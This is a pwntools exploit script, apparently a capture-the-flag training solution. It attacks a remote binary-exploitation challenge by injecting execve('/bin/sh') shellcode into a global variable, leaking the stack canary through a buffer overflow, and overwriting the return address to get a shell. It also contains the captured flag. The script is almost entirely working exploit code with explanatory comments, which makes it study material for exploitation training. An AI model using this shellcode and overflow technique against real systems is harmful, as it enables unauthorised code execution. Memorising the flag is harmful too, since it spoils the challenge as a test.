from pwn import *

r = remote("bin.training.jinblack.it", 2010)
#r = remote("127.0.0.1", 4000)


#in order to make it work, I need to enter a space before inserting "ls"

#flag{canary_may_not_die!}


#same shellcode of the challenge backtoshell, utilizing the stack to push parameters for the execve syscall
#(from the one of backtoshell I obviously removed the first two lines which shifted the shellcode)
#it will be put in the global variable ps1, since I will jump there and execute this shellcode
shellcode = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

#writing on the global variable ps1
#first send: shellcode + little nop sled, to avoid the rewriting of a character with a 0 that would block the printf of the canary then
nop_sled = b"\x90" * 8
payload1 = shellcode + nop_sled
r.sendline(payload1)


#I need a sleep in order not to mix the two different reads
time.sleep(0.5)
#input("press a key...")


#second send: getting the canary, fulling the buffer with characters until I reach the canary, that will be the next 8 bytes of the stack
payload2 = b"a" * 104 #buffer is 104-bytes long
r.sendline(payload2)
r.recvuntil(payload2)

canary = u64(r.recv(8)) - 0xa #retrieving the canary, avoiding the writing of a as the last character of the canary
#print(hex(canary))
#CANARY FOUND: the canary change at every execution


#adding the canary to the payload
payload3 = payload2 + p64(canary)

#last send: retrieving the address of the EIP to overwrite and then using it to place there the return address, that is the
#address of the global variable

#payload4 = payload3 + cyclic(200)
#just to find the address to overwrite
payload4 = payload3 + cyclic(cyclic_find(0x61616163))
#reaching the address and then putting the new EIP
payload4 = payload4 + p64(0x404080)
r.sendline(payload4)

r.interactive()